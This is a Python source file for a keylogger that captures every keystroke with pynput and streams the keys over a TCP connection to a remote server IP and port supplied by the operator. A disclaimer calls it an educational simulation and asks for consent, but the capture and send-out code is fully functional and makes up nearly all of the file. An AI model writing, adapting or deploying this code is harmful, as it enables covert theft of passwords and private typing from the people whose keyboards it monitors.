import socket
import threading
import pynput
from pynput.keyboard import Listener

# Disclaimer function
def disclaimer():
    print("[!] This is a keylogger simulation for educational and training purposes ONLY.")
    print("[!] Do not misuse this knowledge. Unauthorized access is illegal.")
    consent = input("Do you agree to continue? (yes/no): ").strip().lower()
    if consent != "yes":
        print("[+] Exiting simulation. Stay safe!")
        exit()

# Reverse connection client
def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((server_ip, server_port))
        print(f"[+] Connected to {server_ip}:{server_port}")
    except socket.error as e:
        print(f"[!] Connection failed: {e}")
        exit()

    def send_logs(data):
        try:
            client.send(data.encode())
        except BrokenPipeError:
            print("[!] Connection lost. Restart simulation.")
            client.close()
            exit()
        except Exception as e:
            print(f"[!] Error sending data: {e}")
            client.close()
            exit()

    def on_press(key):
        try:
            key = str(key).replace("'", "")
            if key == "Key.space":
                key = " [SPACE] "
            elif key == "Key.enter":
                key = " [ENTER]\n"
            elif key == "Key.backspace":
                key = " [BACKSPACE] "
            send_logs(key)
        except Exception as e:
            print(f"[!] Error processing key: {e}")

    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        disclaimer()
        server_ip = input("Enter server IP for reverse connection: ")
        server_port = int(input("Enter server port: "))
        start_client(server_ip, server_port)
    except ValueError:
        print("[!] Invalid port number. Please enter a valid integer.")
    except KeyboardInterrupt:
        print("\n[+] Simulation terminated by user.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")